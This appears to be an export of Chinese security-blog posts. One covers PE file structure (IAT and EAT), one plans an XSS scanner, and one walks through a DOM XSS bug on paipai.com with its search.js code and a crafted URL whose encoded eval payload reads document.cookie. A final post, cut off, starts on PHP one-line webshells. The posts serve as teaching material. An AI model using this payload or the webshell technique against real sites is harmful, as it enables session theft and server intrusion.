<li>SectionAlignment, FileAlignment  PE 文件的Body 部分划分为若干段，FileAlignment 之处段在磁盘文件中的最小单位，SectionAlignment指定了段在内存中的最小单位。</li>
<li>SizeOfImage 指定 PE Image 在虚拟内存中所占的空间大小。</li>
<li>SizeOfHeader PE 头的大小</li>
<li>Subsystem 用来区分系统驱动文件与普通可执行文件。</li>
<li>NumberOfRvaAndSizes 指定DataDirectory 数组的个数,虽然最后一个值，指出个数是16，但实际上PE 装载还是通过识别这个值来确定大小的。至于DataDirectory 是什么看下边</li>
<li>DataDirectory  它是一个由IMAGE_DATA_DIRECTORY 结构体组成的数组，数组每一项都有定义的值，里边有一些重要的值，EXPORT/IMPORT/RESOURCE, TLS direction 是重点关注的。</li>
</ol>
<h3 id="段头"><strong>段头</strong></h3>
<p>PE 的段头直接沿用的COFF 的段头结构，上边也说过了，我们查看notepad++ 的段头，可以获得各个段名，以及其信息，这里，我们可以使用一些软件查看，更加方便：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684806363696.jpg" alt=""></p>
<h3 id="RVA_to_RAW"><strong>RVA to RAW</strong></h3>
<p>理解PE 最重要的一个部分就是理解文件从磁盘到内存地址的映射过程，做逆向的人员，只有熟练地掌握才能跟踪到程序的调用过程和位置，才能分析和寻找漏洞。</p>
<p>对于文件和内存的映射关系，其实很简单，他们通过一个简单的公式计算而来：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684815471605.jpg" alt=""></p>
<p>换算公式是这样的：</p>
<p>RAW -PointToRawData = RVA - VirtualAddress</p>
<p>寻找过程就是先找到RVA 所在的段，然后根据公式计算出文件偏移。因为我们通过逆向工具，可以在内存中查找到所在的RVA，进而我们就可以计算出在文件中所在的位置，这样，就可以手动进行修改。</p>
<p>看回我们刚才载入的nodepad++ ，其中的V Addr, 实际上就是VirtualAddress，R offset 就是PointerToRawData。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684833906993.jpg" alt=""></p>
<p>假如我们的RVA 地址是5000，那么计算方法就是，查看区段，发现在.text 中，5000-1000+400 = 4400，这就是RAW 00004400，而实际上，因为我们的ImageBase 是00400000，所以，我们在反编译时候内存中的地址是00405000.</p>
<p>接下来，使我们的PE头中的核心内容，IAT 和 EAT，也就是 Import address table, export address table.</p>
<h3 id="IAT"><strong>IAT</strong></h3>
<p>导入地址表的内容与Windows 操作系统的核心进程，内存，DLL 结构有关。他是一种表格，记录了程序使用哪些库中的哪些函数。</p>
<p>下面，让我们把目光转到DLL 上，Dynamic Linked Library 支撑了整个 OS。DLL 的好处在于，不需要把库包含在程序中，单独组成DLL 文件，需要时调用即可，内存映射技术使加载后的DLL 代码，资源在多个进程中实现共享，更新库时候只要替换相关DLL 文件即可。</p>
<p>加载DLL 的方式有两种，一种是显式链接，使用DLL 时候加载，使用完释放内存。另一种是隐式链接，程序开始就一同加载DLL，程序终止的时候才释放掉内存。而IAT 提供的机制与隐式链接相关，最典型的Kernel32.dll。</p>
<p>我们来看看notepad++ 调用kernel32.dll 中的CreateFileW, 使用PE 调试工具Ollydbg</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685051539663.jpg" alt=""><br>我们看到填入参数之后，call 了35d7ffff 地址的内容，然后我们去dump 窗口，找一下kernel.CreateFileW：</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685055938620.jpg" alt=""></p>
<p>我们双击汇编窗口，启动编辑，发现确实是call 的这个数值：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685057233562.jpg" alt=""></p>
<p>可是问题来了，上边是E8 35D7FFFF，下边地址却是 00C62178。其实这是Win Visita, Win 7的ASLR 技术，主要就是针对缓冲溢出攻击的一种保护技术，通过随机化布局，让逆向跟踪者，难以查找地址，就难以简单的进行溢出攻击。不过还是可以通过跳板的方式，找到溢出的办法，这就是后话了。</p>
<p>现在可以确定的是，35D7FFFF 可以认为保存的数值就是 CreateFileW 的地址。而为什么不直接使用CALL 7509168B 这种方式直接调用呢？ Kernel32.dll 版本各不相同，对应的CreateFileW 函数也各不相同，为了兼容各种环境，编译器准备了CreateFileW 函数的实际地址，然后记下DWORD PTR DS：[xxxxxx] 这样的指令，执行文件时候，PE 装载器将CreateFileW 函数地址写到这个位置。</p>
<p>同时，由于重定位的原因存在，所以也不能直接使用CALL 7509168B 的方式，比如两个DLL 文件有相同的 ImageBase，装载的时候，一个装载到该位置之后，另一个就不能装载该位置了，需要换位置。所以我们不能对实际地址进行硬编码。</p>
<p><strong>IMAGE_IMPORT_DESCRIPTOR</strong><br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685068586068.jpg" alt=""><br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685457410563.jpg" alt=""></p>
<p>对于一个普通程序来说，需要导入多少个库，就会存在多少个这样的结构体，这些结构体组成数组，然后数组最后是以NULL 结构体结束。其中有几个重要的成员：</p>
<ul>
<li>OriginalFirstThunk  INT Import Name Table 地址，RVA</li>
<li>Name  库名称字符串地址，RVA，就是说该地址保存库名称</li>
<li>First Thunk  IAT 地址 RVA</li>
<li>INT 中个元素的值是上边那个IMAGE_IMPORT_BY_NAME 结构体指针。</li>
<li>INT 与 IAT 大小应相同。</li>
</ul>
<p>那么PE 是如何导入函数输出到IAT 的：</p>
<ol>
<li>读取NAME 成员，获取扩名称字符串</li>
<li>装载相应库： LoadLibrary(“kernel32.dll”)</li>
<li>读取OriginalFirstThunk成员，获取INT 地址</li>
<li>读取INT 数组中的值，获取相应的 IMAGE_IMPORT_BY_NAME地址，是RVA地址</li>
<li>使用IMAGE_IMPORT_BY_NAME 的Hint 或者是name 项，获取相应函数的起始位置 GetProcAddress(“GetCurrentThreadId”)</li>
<li>读取FistrThunk 成员，获得IAT 地址。</li>
<li>将上面获得的函数地址输入相应IAT 数组值。</li>
<li>重复4-7 到INT 结束。</li>
</ol>
<p>这里就产生了一个疑惑，OriginalFirstThunk 和 First Thunk 都指向的是函数，为什么多此一举呢？</p>
<p>首先，从直观上说，两个都指向了库中引入函数的数组，鱼C 画的这张图挺直观：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685474368965.jpg" alt=""></p>
<p>OriginalFirstThunk 和 FirstThunk 他们都是两个类型为IMAGE_THUNK_DATA 的数组，它是一个指针大小的联合（union）类型。<br>每一个IMAGE_THUNK_DATA 结构定义一个导入函数信息（即指向结构为IMAGE_IMPORT_BY_NAME 的家伙，这家伙稍后再议）。<br>然后数组最后以一个内容为0 的 IMAGE_THUNK_DATA 结构作为结束标志。<br>IMAGE_THUNK_DATA32 结构体如下：</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685474240866.jpg" alt=""></p>
<p>因为是Union 结构，IMAGE_THUNK_DATA 事实上是一个双字大小。<br>规定如下：</p>
<p>当 IMAGE_THUNK_DATA 值的最高位为 1时，表示函数以序号方式输入，这时候低 31位被看作一个函数序号。</p>
<p>当 IMAGE_THUNK_DATA 值的最高位为 0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个 RVA，指向一个 IMAGE_IMPORT_BY_NAME 结构。</p>
<p>我们再看IMAGE_IMPORT_BY_NAME 结构：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685476323595.jpg" alt=""></p>
<p>结构中的 Hint 字段也表示函数的序号，不过这个字段是可选的，有些编译器总是将它设置为 0。</p>
<p>Name 字段定义了导入函数的名称字符串，这是一个以 0 为结尾的字符串。</p>
<p>现在重点来了：</p>
<p><strong>第一个数组（由 OriginalFirstThunk 所指向）是单独的一项，而且不能被改写，我们前边称为 INT。第二个数组（由 FirstThunk 所指向）事实上是由 PE 装载器重写的。</strong></p>
<p>PE 装载器装载顺序正如上边所讲的那样，我们再将它讲详细一点：</p>
<p>PE 装载器首先搜索 OriginalFirstThunk ，找到之后加载程序迭代搜索数组中的每个指针，找到每个 IMAGE_IMPORT_BY_NAME 结构所指向的输入函数的地址，然后加载器用函数真正入口地址来替代由 FirstThunk 数组中的一个入口，因此我们称为输入地址表(IAT).</p>
<p>继续套用鱼C 的图，就能直观的感受到了：</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685477970895.jpg" alt=""></p>
<p>所以，在读取一次OriginalFirstThunk 之后，程序就是依靠IAT 提供的函数地址来运行了。</p>
<h3 id="EAT"><strong>EAT</strong></h3>
<p>搞清楚了IAT 的原理，EAT 就好理解了，目前这篇总结的有点长了，我长话短说。IAT 是导入的库和函数的表，那么EAT 就对应于导出，它使不同的应用程序可以调用库文件中提供的函数，为了方便导出函数，就需要保存这些导出信息。</p>
<p>回头看PE 文件中的PE头我们可以看到IMAGE_EXPORT_DIRECTORY 结构体以的位置，他在IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress 的值就是 IMAGE_EXPORT_DIREDCTORY 的起始位置。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685496702397.jpg" alt=""></p>
<p>IMAGE_EXPORT_DIRECTORY结构体如下：</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685491114979.jpg" alt=""></p>
<p>这里边同样是这么几个重要的成员：</p>
<ul>
<li>NumberOfFunctions  实际Export 函数的个数</li>
<li>NumberOfNames  Export 函数中具名的函数个数</li>
<li>AddressOfFunctins  Export 函数地址数组，数组个数是上边的NOF</li>
<li>AddressOfNames  函数名称地址数组，个数是上边的NON</li>
<li>AddressOfNameOrdinals  Ordinal 地址数组，个数等于上边NON</li>
<li>Name 一个RVA 值，指向一个定义了模块名称的字符串。如即使Kernel32.dll 文件被改名为”Ker.dll”。仍然可以从这个字符串中的值得知其在编译时的文件名是”Kernel32.dll”。</li>
<li>Base：导出函数序号的起始值，将AddressOfFunctions 字段指向的入口地址表的索引号加上这个起始值就是对应函数的导出 序号。<br>以kernel32.dll 为例，我们看一下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685523787323.jpg" alt=""></li>
</ul>
<p>从上边这些成员，我们实际上可以看出，是有两种方式提供给那些想调用该库中函数的，一种是直接从序号查找函数入口地址导入，一种是通过函数名来查找函数入口地址导入。</p>
<p>先上一个鱼C 的图，方便理解：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14685509520225.jpg" alt=""></p>
<p>上边图，注意一点，因为AddressOfNameOrdinals 的序号应当是从0开始的，不过图中映射的是第二个函数指向的序号1。</p>
<p>我们分别说一下两种方式：</p>
<p><strong>当已知导出序号的时候</strong></p>
<ol>
<li>Windows 装载器定位到PE 文件头，</li>
<li>从PE 文件头中的 IMAGE_OPTIONAL_HEADER32 结构中取出数据目录表，并从第一个数据目录中得到导出表的RVA ，</li>
<li>从导出表的 Base 字段得到起始序号，</li>
<li>将需要查找的导出序号减去起始序号，得到函数在入口地址表中的索引，</li>
<li>检测索引值是否大于导出表的 NumberOfFunctions 字段的值，如果大于后者的话，说明输入的序号是无效的用这个索引值在 AddressOfFunctions 字段指向的导出函数入口地址表中取出相应的项目，这就是函数入口地址的RVA 值，当函数被装入内存的时候，这个RVA 值加上模块实际装入的基地址，就得到了函数真正的入口地址</li>
</ol>
<p><strong>当已知函数名称查找入口地址时</strong></p>
<ol>
<li>从导出表的 NumberOfNames 字段得到已命名函数的总数，并以这个数字作为循环的次数来构造一个循环</li>
<li>从 AddressOfNames 字段指向得到的函数名称地址表的第一项开始，在循环中将每一项定义的函数名与要查找的函数名相比较，如果没有任何一个函数名是符合的，表示文件中没有指定名称的函数，如果某一项定义的函数名与要查找的函数名符合，那么记下这个函数名在字符串地址表中的索引值，然后在 AddressOfNamesOrdinals 指向的数组中以同样的索引值取出数组项的值，我们这里假设这个值是x</li>
<li>最后，以 x 值作为索引值，在 AddressOfFunctions 字段指向的函数入口地址表中获取的 RVA 就是函数的入口地址</li>
</ol>
<p>一般来说，做逆向或者是写代码都是第二种方法，我们以kernel32.dll 中的GetProcAddress 函数为例，其操作原理如下：</p>
<ol>
<li>利用 AddressOfNames 成员转到 『函数名称数组』</li>
<li>『函数名称数组』中存储着字符串地址，通过比较字符串，查找指定的函数名称，此时数组所以为成为name_index</li>
<li>利用 AddressOfNameOrdinals 成员，转到这个序号数组</li>
<li>在ordinal 数组中通过name_index 查找到相应的序号</li>
<li>利用AddressOfFunctions 成员，转到『函数地址数组』EAT</li>
<li>在EAT 中将刚刚得到的ordinal 作为索引，获得指定函数的入口地址</li>
</ol>
<hr>
<p>写了这么多，实际上算是对文件结构有了一个入门的认识，至少知道在程序运行过程中，系统是如何进行操作和链接的，而更加详细的内容注入运行时压缩，DLL 注入，API 钩取等技术，就需要在这个基础之上继续挖掘，所以PE ，ELF 文件结构的分析是相当重要的。</p>
<p>PS. 参考：<br><a href="http://blog.fishc.com/1600.html" target="_blank" rel="external">鱼C 讲解PE 文件格式之INT</a><br>《Windows PE 权威指南》<br>《逆向工程核心原理》<br>《程序员的自我修养-链接，装载与库》</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="ELF&amp;PE_文件结构分析">ELF&amp;PE 文件结构分析</h1>
<p>说简单点，ELF 对应于UNIX 下的文件，而PE 则是Windows 的可执行文件，分析ELF 和 PE 的文件结构，是逆向工程，或者是做调试，甚至是开发所应具备的基本能力]]>
    </summary>
    
      <category term="reverse" scheme="http://yoursite.com/tags/reverse/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[打造XSS自动测试工具 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/06/03/%E6%89%93%E9%80%A0XSS%E8%87%AA%E5%8A%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/06/03/打造XSS自动测试工具-XSS升级之路/</id>
    <published>2016-06-03T13:37:15.000Z</published>
    <updated>2016-06-03T13:37:46.000Z</updated>
    <content type="html"><![CDATA[<h1 id="XSS_自动化测试">XSS 自动化测试</h1>
<p>现在我们打了一些不错的散装备，是时候组合一下，打造一款套装了。</p>
<p>XSS 本身由于其原理并不复杂，所以在防御上，往往一些简单的过滤就可以隔绝掉百分之九十九的漏洞，所以对于一个试图挖掘XSS 的人，如果完全手工的去挖掘漏洞，和闭着眼去山里挖金子的概率是差不多的。所以，这个时候，就需要一套自动化渗透测试的工具，帮助我们进行XSS 的挖掘，这样的工具挺多，AWVS 这种比较全面的软件，还有XSSaminer 之类的小工具。</p>
<p>那么，我们准备做的，是去创造一个自动化的小工具，实现自动化测试，也可以让自己更方便的配置需要的内容。</p>
<p>因为XSS 分成反射型，DOM 型，储存型，其中反射型相对容易发现一些，我们就以反射型漏洞挖掘为先机，开始挖掘之路，一个基本的构思比较简单：</p>
<ol>
<li>两种起始端，一种是写个爬虫，一种是写个浏览器插件，在使用浏览的时候，每浏览一个网站，自动重发一些包，尝试进行XSS。两种起始，后边的过程基本相似。</li>
<li>获取网站URL</li>
<li>处理URL，获取参数值，并转换成map结构，key=参数，value=值。</li>
<li>尝试对每个值构造一个独有标识符。此处可以是只用自己设置的独有的一串字符，可以包含一些特殊字符，以方便消减漏报。</li>
<li>可以对重新生成的URL 发送HTTP请求，或者是利用Ajax 对当前URL发送数据。</li>
<li>返回状态码，为200则捕获网页，查找独有标示符。</li>
<li>查找成功代表一个可能的渗透漏洞。</li>
<li>爬虫的话，后边继续获得该URL 网页下，其他的链接，循环调用。可采用广度优先，或者是深度优先，依网站特点而定，个人倾向选择广度优先，因为不会在一个深度里越陷越深，而且获取的URL 要保证同源。</li>
</ol>
<p>补充：</p>
<ol>
<li>以上这个只能算是查找最简单的反射型XSS 的方法，进一步的，如果我们要检测DOM 型漏洞，就需要通过查找一些表单项，抓包分析等方法进行测试。这是后边要做的内容了。</li>
<li>最好添加一个日志功能，将抓包的内容以服务器日志，如nginx 日志格式保存，方便分析和进一步测试。</li>
<li>对于更成熟的工具，线程池和IP池都是必要的，这也是后话了。</li>
</ol>
<p>下面就让我们用Python 从最基础的爬虫开始构建起完整的自动化检测工具吧。</p>
<p>使用库，beautifulsoup，urllib, PhantomJS, Selenium 等。</p>
<p>（未完待续）</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="XSS_自动化测试">XSS 自动化测试</h1>
<p>现在我们打了一些不错的散装备，是时候组合一下，打造一款套装了。</p>
<p>XSS 本身由于其原理并不复杂，所以在防御上，往往一些简单的过滤就可以隔绝掉百分之九十九的漏洞，所以对于一个试图挖掘XSS 的人]]>
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(level 10)DOM XSS 的奥义 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/06/02/-level-10-DOM-XSS-%E7%9A%84%E5%A5%A5%E4%B9%89-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/06/02/-level-10-DOM-XSS-的奥义-XSS升级之路/</id>
    <published>2016-06-02T14:00:14.000Z</published>
    <updated>2016-06-02T14:00:46.000Z</updated>
    <content type="html"><![CDATA[<h1 id="DOM_XSS奥义">DOM XSS奥义</h1>
<p>一些我们普遍了解的XSS 基本已经让大部分开发者们警醒，也都做了足够充分的教训，所以想要像以前那样随意的挖洞就不可能了，但是XSS 是无穷的，只要能深入源码，总会有所发现。</p>
<p>常常程序会动态加载json 数据，同域可以用ajax,而不同域时，就需要跨域请求，有一种方法是jsonp,利用callback回调完成跨域，而在调用外部数据的时候还会带上一些参数，而如果这些参数可控，我们就可以试图去挖掘漏洞。</p>
<p>对于跨域的请求来说，最常见的形式是这样：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">somescript.src=<span class="string">"http://otherdomain.com/xx?jsonp=callback"</span></div></pre></td></tr></table></figure>

<p>而为了方便，callback 后边会带上一些参数，有一些参数是用户可控的，那时候，就会造成困扰了：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">somescript.src=<span class="string">"http://otherdomain.com/xx?jsonp=callback&id="</span>+id;</div></pre></td></tr></table></figure>

<p>如果其中的ID 可控，那就很有可能会带来问题，这算是一种地址可控，而地址可控分为三种形式：</p>
<p>一种是，完全可控，也就是src 后边的内容可以直接替换掉，这种可以直接利用，替换成我们的JS 地址。</p>
<p>一种是部分可控：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">script src=<span class="string">"/path/xxx/[路径可控]/1.js"</span></div></pre></td></tr></table></figure>

<p>这种情况下一般是在同域下寻找一个有漏洞的上传点，上传些文件什么的，以便利用。</p>
<p>第三种情况是参数可控：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">script src=<span class="string">"/xxxx/json.php?callback=xxxx&param1=yyy&param2=[参数可控]"</span></div></pre></td></tr></table></figure>

<p>以乌云某例为例：<br><a href="http://sse1.paipai.com/comm_json?callback=commentListCallBack&amp;dtag=1&amp;ac=1&amp;cluster=1&amp;sellquality=0&amp;NewProp=&amp;Property=256&amp;PageNum=1&amp;PageSize=48&amp;OrderStyle=80&amp;Address=&amp;SaleType=1&amp;degree=1&amp;AuthType=2&amp;BeginPrice=&amp;EndPrice=&amp;KeyWord=2012%20%D0%C2&amp;OnlineState=2&amp;Paytype=4&amp;ranking=&amp;sClassid=&#39;aaaaaaaa&amp;t=1354854681" target="_blank" rel="external">http://sse1.paipai.com/comm_json?callback=commentListCallBack&amp;dtag=1&amp;ac=1&amp;cluster=1&amp;sellquality=0&amp;NewProp=&amp;Property=256&amp;PageNum=1&amp;PageSize=48&amp;OrderStyle=80&amp;Address=&amp;SaleType=1&amp;degree=1&amp;AuthType=2&amp;BeginPrice=&amp;EndPrice=&amp;KeyWord=2012%20%D0%C2&amp;OnlineState=2&amp;Paytype=4&amp;ranking=&amp;sClassid=&#39;aaaaaaaa&amp;t=1354854681</a></p>
<p>经过简单在这个页面测试，我们可以发现，其中的callback, dtag, ranking 是可控的。不过可控的元素还是会被过滤的，比如常见的尖括号就一定会被过滤。</p>
<p>实际在使用中，访问这个跨域数据的是以下URL:<br><a href="http://bag.paipai.com/search_list.shtml?type=&amp;callback=alert(1);&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=&amp;PTAG=20058.13.13" target="_blank" rel="external">http://bag.paipai.com/search_list.shtml?type=&amp;callback=alert(1);&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=&amp;PTAG=20058.13.13</a></p>
<p>因为dtag，ranking 是放在双引号里的，过滤了双引号，基本很难有可以应用的地方。而callback 则不是，如果能构造一个callback=alert(1) ，就可以执行XSS，不过在我们发现写在一开始的callback 并不能直接去改变值来控制它，我们可以想办法通过后边可控的参数，用&amp;来分隔后再来一个callback=alert(1)来覆盖前边的callback。</p>
<p>不过一般来说，如果你在构造URL 的时候，如果使用了&amp;，那就会直接认为你这是分隔符，这个方法就失效了。而如果我们试图使用%26 这个URL 编码来代替，但是它在传递的时候，并不会解码，所以也不会让服务器解析的时候才认定他是分隔符。</p>
<p>所以，只能去从源码里找漏洞,我们找到他的search.js脚本，定位到那一块观察上下文：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>{</div><div class="line"></div><div class="line">        <span class="keyword">var</span> keyword = decodeURIComp($getQuery(<span class="string">'keyword'</span>)),</div><div class="line"></div><div class="line">        type = $getQuery(<span class="string">'type'</span>),</div><div class="line"></div><div class="line">        searchtype = $getQuery(<span class="string">'searchtype'</span>);</div><div class="line"></div><div class="line">        option.keyword = keyword;</div><div class="line"></div><div class="line">        option.classId = type;</div><div class="line"></div><div class="line">        option.searchType = searchtype || option.searchType;</div><div class="line"></div><div class="line">        option.beginPrice = $getQuery(<span class="string">'bp'</span>);</div><div class="line"></div><div class="line">        option.endPrice = $getQuery(<span class="string">'ep'</span>);</div><div class="line"></div><div class="line">        option.NewProp = $getQuery(<span class="string">'np'</span>) || $getQuery(<span class="string">'newprop'</span>);</div><div class="line"></div><div class="line">        option.property = $getQuery(<span class="string">'pro'</span>) || option.property;</div><div class="line"></div><div class="line">        option.cid = $getQuery(<span class="string">'cid'</span>);</div><div class="line"></div><div class="line">        option.Paytype = $getQuery(<span class="string">'pt'</span>) || option.Paytype;</div><div class="line"></div><div class="line">        option.hongbaoKeyword = $getQuery(<span class="string">'hb'</span>);</div><div class="line"></div><div class="line">        option.conditionStatus = $getQuery(<span class="string">'cs'</span>) || option.conditionStatus;</div><div class="line"></div><div class="line">        option.showType = $getQuery(<span class="string">'show'</span>) || option.showType;</div><div class="line"></div><div class="line">        option.mode = $getQuery(<span class="string">'mode'</span>) || option.mode;</div><div class="line"></div><div class="line">        option.address = decodeURIComp($getQuery(<span class="string">'adr'</span>));</div><div class="line"></div><div class="line">        option.orderStyle = $getQuery(<span class="string">'os'</span>) || option.orderStyle || <span class="number">80</span>;</div><div class="line"></div><div class="line">        option.hideKeyword = $getQuery(<span class="string">'hkwd'</span>) == <span class="string">"true"</span> ? <span class="literal">true</span>: <span class="literal">false</span>;</div><div class="line"></div><div class="line">        option.ptag.currentPage = $getQuery(<span class="string">'ptag'</span>) || $getQuery(<span class="string">'PTAG'</span>);</div><div class="line"></div><div class="line">        <span class="keyword">var</span> pageIndex = $getQuery(<span class="string">'pi'</span>),</div><div class="line"></div><div class="line">        pageSize = $getQuery(<span class="string">'ps'</span>);</div><div class="line"></div><div class="line">        option.pageIndex = (pageIndex && $isPInt(pageIndex)) ? pageIndex * <span class="number">1</span>: option.pageIndex;</div><div class="line"></div><div class="line">        option.pageSize = (pageSize && $isPInt(pageSize)) ? pageSize * <span class="number">1</span>: option.pageSize;</div><div class="line"></div><div class="line">    };</div></pre></td></tr></table></figure>

<p>这里的脚本，就是jason参数和当前页面获得参数的一些关系，而其中有一个函数让我们看到了希望： decodeURLComp，它在传进来的时候，会被解码一次，有木有想起什么。对于这个keyword，如果我们使用了URL 编码传%26进去，他会解码成&amp;，那么我们直接使用%26callback=alert(1)，那就可以会被解码成一个分隔符，然后出发我们的漏洞。</p>
<p>构造URL：<br><a href="http://bag.paipai.com/search_list.shtml?type=213280&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=%26callback=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));void&amp;PTAG=20058.13.13" target="_blank" rel="external">http://bag.paipai.com/search_list.shtml?type=213280&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=%26callback=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));void&amp;PTAG=20058.13.13</a></p>
<p>抓个包，可以看到接收的json 数据已经得到改变：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-06-02-14648755927662.jpg" alt=""></p>
<p>弹窗就是自然的了。</p>
<p>其实，这个漏洞已经显得有些运气成分了，也可以说是开发者在业务的逻辑关系变得复杂之后，往往就缺乏足够的安全意识，去处理这些跨域安全问题了，往往在源码上，会造成一些漏洞。上边的例子我们也能看到，本身在过滤的逻辑上，已经很难寻找漏洞，但是因为开发者在处理流程的时候，没有去思考它可能的上下文关系，也就主动创造了一个漏洞出来。</p>
<p>DOM XSS 的内容，大概也就这么多了。在DOM XSS 漏洞的挖掘中，最常用的自动化挖掘方式，其实就是利用爬虫和抓包重放，爬虫通过遍历某网站的各种结构URL，然后抓包重放去构造独特的字符替换掉URL中那些可控的参数，通过服务器返回的状态，和内容，去挖掘可能存在的不安全因素。</p>
<p>而挖掘到不安全因素，只是XSS 最早的第一步，现在，那些最常见的漏洞已经基本销声匿迹，需要的是通过分析源码，寻找某个点的上下文关系，通过理清逻辑关系，寻找开发者在其中的疏漏，才能创造出合适的XSS。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="DOM_XSS奥义">DOM XSS奥义</h1>
<p>一些我们普遍了解的XSS 基本已经让大部分开发者们警醒，也都做了足够充分的教训，所以想要像以前那样随意的挖洞就不可能了，但是XSS 是无穷的，只要能深入源码，总会有所发现。</p>
<p>常常程序会动态加载]]>
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[给我一句话的时间 -- PHP后门溯源]]></title>
    <link href="http://yoursite.com/2016/05/31/%E7%BB%99%E6%88%91%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%9A%84%E6%97%B6%E9%97%B4-PHP%E5%90%8E%E9%97%A8%E6%BA%AF%E6%BA%90/"/>
    <id>http://yoursite.com/2016/05/31/给我一句话的时间-PHP后门溯源/</id>
    <published>2016-05-31T08:06:57.000Z</published>
    <updated>2016-06-01T14:00:17.000Z</updated>
    <content type="html"><![CDATA[<h1 id="给我一句话的时间_—_那些一句话后门">给我一句话的时间 — 那些一句话后门</h1>
<h2 id="0X01_简单原理">0X01 简单原理</h2>
<p>在我们进行渗透测试的最后阶段，入侵到内网里，无论是想要浏览网站结构，还是抓取数据库，或者是挂个木马什么的，到最后最常用的就是执行一句话木马，从客户端轻松连接服务器。</p>
<p>一句话木马的原理很简单，造型也很简单，所以造成了它理解起来容易，抵御起来也容易，于是黑白的较量变成了黑帽不断的构造变形的后门，去隐蔽特征，而白帽则不断的更新过滤方法，建起更高的城墙。</p>
<p>简单的说一下原理，对于不同的语言有不同的构造方法，基本构造是首先出现的是脚本开始的标记，后边跟着的eval 或者是execute 是核心部分，就是获取并执行后边得到的内容，而后边得到的内容，是request或者是 $_POST 获取的值，显然这些内容，如果我们通过客户端向服务器发送，那么就会让服务器执行我们发送的脚本，挂马就实现了。最常见造型的木马如下：</p>
